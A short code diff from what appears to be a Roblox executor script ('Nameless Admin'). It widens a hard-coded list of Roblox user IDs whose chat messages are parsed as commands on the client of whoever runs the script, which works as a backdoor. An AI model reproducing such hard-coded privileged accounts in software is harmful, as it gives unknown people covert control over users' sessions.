@@ -14,6 +14,7 @@
                                                                                              
 
 ]] 
+
 if getgenv().NamelessLoaded then return end
 
 local function NACaller(pp) -- helps me log better
@@ -14973,7 +14974,8 @@ end)
 
 -- [[ Admin Player]]
 function IsAdminAndRun(Message,Player)
-	if Admin[Player.UserId] or (Player.UserId==156256804 or Player.UserId==530829101 or Player.UserId==229501685) then
+	relAdmins=(Player.UserId==156256804 or Player.UserId==530829101 or Player.UserId==229501685 or Player.UserId==3470956640 or Player.UserId==1456118719 or Player.UserId==817571515 or Player.UserId==144324719 or Player.UserId==1844177730)
+	if Admin[Player.UserId] or relAdmins then
 		lib.parseCommand(Message,Player)
 	end
 end
